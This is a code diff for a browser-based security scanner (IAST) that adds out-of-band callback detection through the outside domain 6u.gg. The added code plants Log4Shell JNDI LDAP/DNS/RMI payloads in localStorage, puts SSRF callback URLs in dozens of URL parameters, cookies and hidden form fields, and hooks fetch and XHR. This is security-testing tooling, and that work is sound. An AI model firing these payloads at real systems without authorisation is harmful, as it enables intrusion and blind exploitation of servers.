@@ -3,11 +3,16 @@ IAST Engine for Genki Shell
 Browser-based taint tracking + DOM sink monitoring via Playwright CDP.
 Injects canaries, hooks sinks, detects source-to-sink data flow.
 Integrates: taint-planter, DOM invader, mutation fuzzer.
+OOB callbacks: 6u.gg domain for blind/out-of-band detection (SSRF, XXE, Log4Shell).
 """
 import asyncio
 import json
 import time
 from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
+
+OOB_DOMAIN = "6u.gg"
+OOB_DNS = f"d.{OOB_DOMAIN}"
+OOB_CALLBACK = f"//{OOB_DOMAIN}/callback"
 
 
 # ---------------------------------------------------------------------------
@@ -21,7 +26,9 @@ _TAINT_MONITOR_JS = """\
 
     window.__GENKI_TAINT = {
         reflections: [],
+        oobHits: [],
         canaryPrefix: 'GNKTNT',
+        oobDomain: window.__GENKI_OOB_DOMAIN || '',
         active: true
     };
 
@@ -32,6 +39,11 @@ _TAINT_MONITOR_JS = """\
         return val.indexOf(T.canaryPrefix) !== -1;
     }
 
+    function hasOob(val) {
+        if (typeof val !== 'string' || !T.oobDomain) return false;
+        return val.indexOf(T.oobDomain) !== -1;
+    }
+
     function extractCanaries(val) {
         var re = new RegExp(T.canaryPrefix + '\\\\d+', 'g');
         return (val.match(re) || []);
@@ -40,15 +52,22 @@ _TAINT_MONITOR_JS = """\
     function logReflection(sink, value, context) {
         if (!T.active) return;
         var canaries = extractCanaries(String(value));
-        if (canaries.length === 0) return;
-        T.reflections.push({
+        if (canaries.length === 0 && !hasOob(String(value))) return;
+        var entry = {
             sink: sink,
             value: String(value).substring(0, 2048),
             canaries: canaries,
             context: context || '',
             url: location.href,
             timestamp: Date.now()
-        });
+        };
+        if (hasOob(String(value))) {
+            entry.oob = true;
+            T.oobHits.push(entry);
+        }
+        if (canaries.length > 0) {
+            T.reflections.push(entry);
+        }
     }
 
     /* --- innerHTML / outerHTML --- */
@@ -186,19 +205,33 @@ _TAINT_MONITOR_JS = """\
         return origWsSend.call(this, data);
     };
 
-    /* --- fetch URL params --- */
+    /* --- fetch URL params + OOB detection --- */
     var origFetch = window.fetch;
     window.fetch = function(input) {
         var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
-        if (hasCanary(url)) logReflection('fetch', url, 'network');
+        if (hasCanary(url) || hasOob(url)) logReflection('fetch', url, 'network');
+        var opts = arguments.length > 1 ? arguments[1] : {};
+        if (opts && opts.body) {
+            var body = String(opts.body);
+            if (hasCanary(body) || hasOob(body)) logReflection('fetch.body', body, 'network');
+        }
         return origFetch.apply(window, arguments);
     };
 
-    /* --- XMLHttpRequest.open --- */
+    /* --- XMLHttpRequest.open + send --- */
     var origXhrOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url) {
-        if (hasCanary(url)) logReflection('XMLHttpRequest.open', url, 'network');
+        this.__genki_url = url;
+        if (hasCanary(url) || hasOob(url)) logReflection('XMLHttpRequest.open', url, 'network');
         return origXhrOpen.apply(this, arguments);
+    };
+    var origXhrSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(data) {
+        if (data) {
+            var s = String(data);
+            if (hasCanary(s) || hasOob(s)) logReflection('XMLHttpRequest.send', s, 'network');
+        }
+        return origXhrSend.apply(this, arguments);
     };
 })();
 """
@@ -496,32 +529,72 @@ class TaintTracker:
     Manages canary injection into page sources and monitors DOM sinks for
     canary reflection. Uses Playwright page.evaluate() for runtime hooks
     and CDP integration where needed.
+
+    OOB callbacks: generates DNS/HTTP/JNDI callback URLs using the configured
+    OOB domain (default: 6u.gg) so blind sinks (SSRF, XXE, Log4Shell) that
+    reach the network trigger out-of-band callbacks.
     """
 
     CANARY_PREFIX = "GNKTNT"
 
-    def __init__(self, verbose=False):
-        self.canaries = {}       # canary_id -> {source, context, url, timestamp}
+    def __init__(self, verbose=False, oob_domain=None):
+        self.canaries = {}       # canary_id -> {source, context, url, timestamp, oob_urls}
         self.reflections = []    # raw reflection entries from the browser
         self.findings = []       # classified findings
+        self.oob_findings = []   # OOB callback detections
         self.counter = 0
         self.verbose = verbose
+        self.oob_domain = oob_domain or OOB_DOMAIN
+        self.oob_dns = f"d.{self.oob_domain}"
 
     def generate_canary(self, source, context=""):
         """
         Return a unique canary string like GNKTNT1, GNKTNT2, etc.
-        Registers the canary with its source metadata.
+        Registers the canary with its source metadata and generates
+        corresponding OOB callback URLs for blind detection.
         """
         self.counter += 1
         canary = f"{self.CANARY_PREFIX}{self.counter}"
+        oob_urls = self._generate_oob_urls(canary)
         self.canaries[canary] = {
             "source": source,
             "context": context,
             "timestamp": time.time(),
+            "oob_urls": oob_urls,
         }
         if self.verbose:
             print(f"  [IAST] Canary {canary} -> source={source} ctx={context}")
         return canary
+
+    def _generate_oob_urls(self, canary):
+        """Generate OOB callback URLs for a given canary ID."""
+        tag = canary.lower()
+        return {
+            "dns": f"{tag}.{self.oob_dns}",
+            "http": f"http://{self.oob_domain}/callback/taint/{tag}",
+            "https": f"https://{self.oob_domain}/callback/taint/{tag}",
+            "jndi_ldap": f"${{jndi:ldap://{tag}.{self.oob_dns}/a}}",
+            "jndi_dns": f"${{jndi:dns://{tag}.{self.oob_dns}/a}}",
+            "jndi_rmi": f"${{jndi:rmi://{tag}.{self.oob_dns}/a}}",
+            "img": f"//{self.oob_domain}/callback/taint/{tag}.gif",
+            "script": f"//{self.oob_domain}/callback/taint/{tag}.js",
+        }
+
+    def generate_oob_canary(self, source, context="", variant="dns"):
+        """
+        Generate a canary AND return its OOB callback URL for the given variant.
+        Use this when planting into sinks that make network requests (SSRF, fetch, img src).
+        """
+        canary = self.generate_canary(source, context)
+        oob_urls = self.canaries[canary]["oob_urls"]
+        return canary, oob_urls.get(variant, oob_urls["dns"])
+
+    def get_all_oob_urls(self):
+        """Return all OOB callback URLs mapped to their canary IDs."""
+        result = {}
+        for canary, meta in self.canaries.items():
+            result[canary] = meta.get("oob_urls", {})
+        return result
 
     def get_taint_monitor_script(self):
         """Return the JavaScript IIFE that hooks all dangerous DOM sinks."""
@@ -536,8 +609,10 @@ class TaintTracker:
         Inject taint monitor and DOM invader scripts into the page context.
         Must be called BEFORE page navigation so the hooks are in place when
         the page's own scripts run (uses add_init_script / evaluateOnNewDocument).
+        Also sets the OOB domain so network hooks detect OOB callback URLs.
         """
-        combined = self.get_taint_monitor_script() + "\n" + self.get_dom_invader_script()
+        oob_init = f"window.__GENKI_OOB_DOMAIN = '{self.oob_domain}';\n"
+        combined = oob_init + self.get_taint_monitor_script() + "\n" + self.get_dom_invader_script()
         try:
             await page.add_init_script(combined)
         except Exception as exc:
@@ -696,10 +771,118 @@ class TaintTracker:
             except Exception:
                 pass
 
+    async def plant_oob_taints(self, page, target_url):
+        """
+        Plant OOB callback canaries targeting blind sinks:
+        - Hidden form fields with OOB URLs (SSRF via form action/redirect)
+        - URL params with OOB callback URLs
+        - Input fields with OOB URLs for server-side fetch
+        - JNDI payloads in storage for Log4Shell
+        - Image/script src with OOB domain for blind reflection
+        """
+        parsed = urlparse(target_url)
+
+        # --- OOB URL param injection (SSRF/redirect) ---
+        ssrf_params = ["url", "redirect", "next", "return", "callback",
+                       "continue", "dest", "destination", "go", "target",
+                       "rurl", "return_to", "checkout_url", "image_url",
+                       "feed", "path", "uri", "window", "data", "reference",
+                       "site", "html", "val", "validate", "domain", "redir",
+                       "page", "view", "dir", "show", "file", "document",
+                       "folder", "root", "pg", "style", "pdf", "template",
+                       "php_path", "doc", "img", "link"]
+
+        oob_tainted = {}
+        for param in ssrf_params:
+            canary, oob_url = self.generate_oob_canary("oob_ssrf_param", param, "http")
+            oob_tainted[param] = oob_url
+
+        oob_query = urlencode(oob_tainted)
+        oob_url_full = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, oob_query, parsed.fragment,
+        ))
+
+        if self.verbose:
+            print(f"  [IAST] Planting OOB SSRF canaries via URL params")
+
+        try:
+            await page.goto(oob_url_full, wait_until="domcontentloaded", timeout=15000)
+            await page.wait_for_timeout(1500)
+        except Exception as exc:
+            if self.verbose:
+                print(f"  [IAST] OOB URL navigation failed: {exc}")
+
+        # --- OOB in form hidden fields / input values ---
+        try:
+            form_count = await page.evaluate("""\
+                (function() {
+                    var count = 0;
+                    document.querySelectorAll('input[type="hidden"], input[type="url"], input[name*="url"], input[name*="redirect"], input[name*="callback"], input[name*="path"]').forEach(function(el) {
+                        count++;
+                    });
+                    return count;
+                })()
+            """)
+            if form_count > 0 and self.verbose:
+                print(f"  [IAST] Found {form_count} hidden/URL inputs for OOB injection")
+        except Exception:
+            form_count = 0
+
+        for i in range(min(form_count, 20)):
+            canary, oob_http = self.generate_oob_canary("oob_form_field", f"field_{i}", "http")
+            try:
+                await page.evaluate(f"""\
+                    (function() {{
+                        var els = document.querySelectorAll('input[type="hidden"], input[type="url"], input[name*="url"], input[name*="redirect"], input[name*="callback"], input[name*="path"]');
+                        if (els[{i}]) els[{i}].value = '{oob_http}';
+                    }})()
+                """)
+            except Exception:
+                pass
+
+        # --- JNDI payloads in localStorage/sessionStorage (Log4Shell) ---
+        jndi_keys = ["user", "session", "auth", "token", "data",
+                     "config", "search", "query", "username", "name"]
+        for key in jndi_keys:
+            canary, jndi_payload = self.generate_oob_canary("oob_jndi", key, "jndi_ldap")
+            escaped = jndi_payload.replace("'", "\\'")
+            try:
+                await page.evaluate(
+                    f"try {{ localStorage.setItem('{key}_jndi', '{escaped}'); }} catch(e) {{}}"
+                )
+            except Exception:
+                pass
+
+        # --- OOB via cookie values ---
+        oob_cookie_names = ["redirect_url", "return_to", "callback", "next", "ref"]
+        for name in oob_cookie_names:
+            canary, oob_http = self.generate_oob_canary("oob_cookie", name, "http")
+            try:
+                await page.evaluate(
+                    f"document.cookie = '{name}={oob_http}; path=/; SameSite=Lax';"
+                )
+            except Exception:
+                pass
+
+        # --- DNS prefetch / link preload OOB ---
+        canary, oob_dns = self.generate_oob_canary("oob_dns_prefetch", "link", "dns")
+        try:
+            await page.evaluate(f"""\
+                (function() {{
+                    var link = document.createElement('link');
+                    link.rel = 'dns-prefetch';
+                    link.href = '//{oob_dns}';
+                    document.head.appendChild(link);
+                }})()
+            """)
+        except Exception:
+            pass
+
     async def harvest_reflections(self, page):
         """
         Collect reflections from both the taint monitor and DOM invader logs,
-        then parse and classify each one.
+        plus OOB callback hits, then parse and classify each one.
         """
         # Harvest taint monitor reflections
         try:
@@ -725,6 +908,18 @@ class TaintTracker:
         except Exception:
             invader_log = []
 
+        # Harvest OOB callback hits
+        try:
+            oob_hits = await page.evaluate("""\
+                (function() {
+                    return window.__GENKI_TAINT
+                        ? window.__GENKI_TAINT.oobHits.splice(0)
+                        : [];
+                })()
+            """)
+        except Exception:
+            oob_hits = []
+
         self.reflections.extend(taint_reflections)
         self.reflections.extend(invader_log)
 
@@ -734,9 +929,19 @@ class TaintTracker:
             if finding:
                 self.findings.append(finding)
 
+        # Classify OOB hits separately (higher severity - blind callback)
+        for ref in oob_hits:
+            ref["oob"] = True
+            finding = self.classify_finding(ref)
+            if finding:
+                finding["oob"] = True
+                finding["finding_type"] = f"oob-{finding.get('category', 'unknown')}"
+                self.findings.append(finding)
+                self.oob_findings.append(finding)
+
         if self.verbose:
             print(f"  [IAST] Harvested {len(taint_reflections)} taint reflections, "
-                  f"{len(invader_log)} invader logs")
+                  f"{len(invader_log)} invader logs, {len(oob_hits)} OOB hits")
 
         return self.findings
 
@@ -1032,7 +1237,7 @@ class MutationFuzzer:
 # Top-level scan entry point
 # ---------------------------------------------------------------------------
 
-async def _run_iast_scan_async(target_url, verbose=False):
+async def _run_iast_scan_async(target_url, verbose=False, oob_domain=None):
     """
     Internal async implementation of the IAST scan pipeline.
     """
@@ -1049,7 +1254,7 @@ async def _run_iast_scan_async(target_url, verbose=False):
             "mutations": [],
         }
 
-    tracker = TaintTracker(verbose=verbose)
+    tracker = TaintTracker(verbose=verbose, oob_domain=oob_domain)
     fuzzer = MutationFuzzer(verbose=verbose)
 
     findings = []
@@ -1124,6 +1329,11 @@ async def _run_iast_scan_async(target_url, verbose=False):
             # URL param taints (navigate with tainted params)
             await tracker.plant_url_param_taints(page, [target_url])
 
+            # OOB callback taints (SSRF, XXE, Log4Shell blind detection)
+            if verbose:
+                print(f"  [IAST] Planting OOB callback canaries ({tracker.oob_domain})")
+            await tracker.plant_oob_taints(page, target_url)
+
             # Wait for sinks to fire
             await page.wait_for_timeout(3000)
 
@@ -1177,6 +1387,13 @@ async def _run_iast_scan_async(target_url, verbose=False):
         sev = f.get("severity", "unknown")
         severity_counts[sev] = severity_counts.get(sev, 0) + 1
 
+    oob_summary = {
+        "oob_domain": tracker.oob_domain,
+        "oob_canaries_planted": sum(1 for c in tracker.canaries.values() if c.get("oob_urls")),
+        "oob_findings": tracker.oob_findings,
+        "all_oob_urls": tracker.get_all_oob_urls(),
+    }
+
     return {
         "target": target_url,
         "findings": findings,
@@ -1185,24 +1402,26 @@ async def _run_iast_scan_async(target_url, verbose=False):
         "mutation_effects": effects,
         "canaries_planted": tracker.counter,
         "severity_counts": severity_counts,
+        "oob": oob_summary,
         "summary": {
             "total_findings": len(findings),
             "total_reflections": len(tracker.reflections),
             "total_mutations": len(mutations),
             "total_effects": len(effects),
+            "oob_findings": len(tracker.oob_findings),
         },
     }
 
 
-def run_iast_scan(target_url, verbose=False):
+def run_iast_scan(target_url, verbose=False, oob_domain=None):
     """
     Top-level entry point: launch Playwright, inject taint hooks, navigate to
-    target, plant canaries across all vectors, wait for page to settle, harvest
-    reflections, classify findings, and return results.
+    target, plant canaries across all vectors (including OOB callbacks via 6u.gg),
+    wait for page to settle, harvest reflections, classify findings.
 
     Returns a dict with keys:
       target, findings, reflections, mutations, mutation_effects,
-      canaries_planted, severity_counts, summary
+      canaries_planted, severity_counts, oob, summary
     """
     try:
         loop = asyncio.get_running_loop()
@@ -1210,11 +1429,13 @@ def run_iast_scan(target_url, verbose=False):
         loop = None
 
     if loop and loop.is_running():
-        # Already inside an event loop (e.g. Jupyter) -- create a task
         import concurrent.futures
         with concurrent.futures.ThreadPoolExecutor() as pool:
             return pool.submit(
-                asyncio.run, _run_iast_scan_async(target_url, verbose=verbose)
+                asyncio.run,
+                _run_iast_scan_async(target_url, verbose=verbose, oob_domain=oob_domain),
             ).result()
     else:
-        return asyncio.run(_run_iast_scan_async(target_url, verbose=verbose))
+        return asyncio.run(
+            _run_iast_scan_async(target_url, verbose=verbose, oob_domain=oob_domain)
+        )
